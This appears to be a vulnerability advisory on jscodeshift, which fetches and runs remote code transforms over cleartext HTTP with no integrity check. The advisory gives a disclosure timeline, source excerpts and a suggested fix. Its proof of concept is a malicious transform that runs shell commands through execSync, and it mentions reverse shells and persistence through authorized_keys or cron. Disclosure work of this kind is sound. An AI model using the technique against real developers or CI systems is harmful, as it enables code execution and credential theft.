https://github.com/facebook/jscodeshift

 ## Finding: jscodeshift fetches a remote code transform over cleartext HTTP and executes it without integrity verification, allowing a network attacker to achieve code execution on the operator's machine

Package: npm:jscodeshift

Affected Versions: confirmed on v17.3.0

CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H (7.5 High)

CWE: CWE-494 Download of Code Without Integrity Check; CWE-319 Cleartext Transmission of Sensitive Information

### Disclosure
 - 10 July 2026 reported via Meta Bug Bounty program
 - 14 July 2026 - closed without explanation because "Due to the volume of reports we currently receive, we are unable to provide detailed information as to how we reached this decision."

### Summary

jscodeshift accepts a transform passed as an `http://` or `https://` URL. When
the URL uses cleartext `http://`, the file is fetched over an unauthenticated,
unencrypted channel using the Node `http` module, written to a temporary file,
and then loaded with `require()` inside a worker, which executes any top-level
code in the fetched body. There is no TLS enforcement, no certificate
validation for the cleartext case, and no integrity check (hash/signature) on
the downloaded code. A network attacker able to observe or modify traffic
between the operator and the transform host (a man-in-the-middle: rogue access
point, ARP/DNS spoofing, a malicious or transparent proxy, or a hostile CDN
edge) can replace the transform body with arbitrary JavaScript, which jscodeshift
then executes with the privileges of the operator running the command.

### Details

The remote-transform branch selects the plain `http` module for any URL that
does not begin with `https`, and executes the fetched contents:

`src/Runner.js` (retrieveTransform)
```js
if (/^http/.test(transformFile)) {
  return new Promise((resolve, reject) => {
    (transformFile.indexOf('https') !== 0 ? http : https).get(transformFile, (res) => {
      let contents = '';
      res
        .on('data', (d) => { contents += d.toString(); })
        .on('end', () => {
          const ext = path.extname(transformFile);
          tmp.file({ prefix: 'jscodeshift', postfix: ext }, (err, path, fd) => {
            ...
            fs.write(fd, contents, function (err) {
              ...
              fs.close(fd, function (err) {
                ...
                transform(path).then(resolve, reject); // -> worker require(transform)
```

The transform path is threaded straight from the CLI argument:

`bin/jscodeshift.js`
```js
Runner.run(
  /^https?/.test(options.transform) ? options.transform : path.resolve(options.transform),
  paths,
  options
);
```

and the worker loads and runs it:

`src/Worker.js`
```js
const module = require(tr); // executes top-level code in the fetched transform
```

Because the selector is `transformFile.indexOf('https') !== 0`, any URL that is
not exactly prefixed with `https` (in particular every `http://` URL) is fetched
with the cleartext `http` module. No integrity verification is applied to the
downloaded bytes before they are written to disk and `require()`d. An attacker
in a man-in-the-middle position for that request substitutes their own
JavaScript; the top-level statements (or the exported transform function) run in
the jscodeshift process.

### PoC

1) Attacker (MITM) serves a malicious transform in place of the expected one.
For demonstration the payload is hosted locally; in a real attack the same body
is injected by rewriting the cleartext http response:

`evil.js`
```js
require('child_process').execSync("id > /tmp/JSCS_PWNED.txt; echo HTTP_TRANSFORM_RCE >> /tmp/JSCS_PWNED.txt");
module.exports = function (fileInfo, api) { return fileInfo.source; };
```

Serve it over plain http:
```
python3 -m http.server 9711 --bind 127.0.0.1
```

2) Operator runs jscodeshift with an http transform URL against any file (a
routine invocation of a shared/remote codemod):
```
jscodeshift -t http://127.0.0.1:9711/evil.js ./target.js
```

3) Observed result: jscodeshift reports a normal run, and the injected code has
already executed:
```
$ cat /tmp/JSCS_PWNED.txt
uid=<REDACTED> gid=<REDACTED> groups=<REDACTED>
HTTP_TRANSFORM_RCE
```

The attacker chooses any command; a reverse shell, or writing to `~/.bashrc`,
`~/.ssh/authorized_keys`, or a cron file, yields persistent execution as the
operator. The transform reported success ("unmodified") so nothing looks amiss.

### Impact

Arbitrary code execution as the user running jscodeshift, when a codemod is
invoked via an `http://` transform URL and an attacker holds a MITM position for
that fetch. jscodeshift is widely used in codebase-migration workflows and is
often run by developers or in automation (CI) with access to source code,
credentials in the environment, SSH keys, and package-publishing tokens.
Fetching executable code over cleartext with no integrity check turns any such
run into a remote-code-execution vector for a network attacker.

Suggested fix: reject cleartext `http://` transform URLs (require `https://`),
or at minimum emit a prominent warning and refuse by default; verify TLS
certificates on the https path; and consider supporting an integrity check
(for example an expected SHA-256 supplied on the command line) before executing
any downloaded transform. The current selector
`transformFile.indexOf('https') !== 0 ? http : https` should not silently
downgrade to cleartext. 
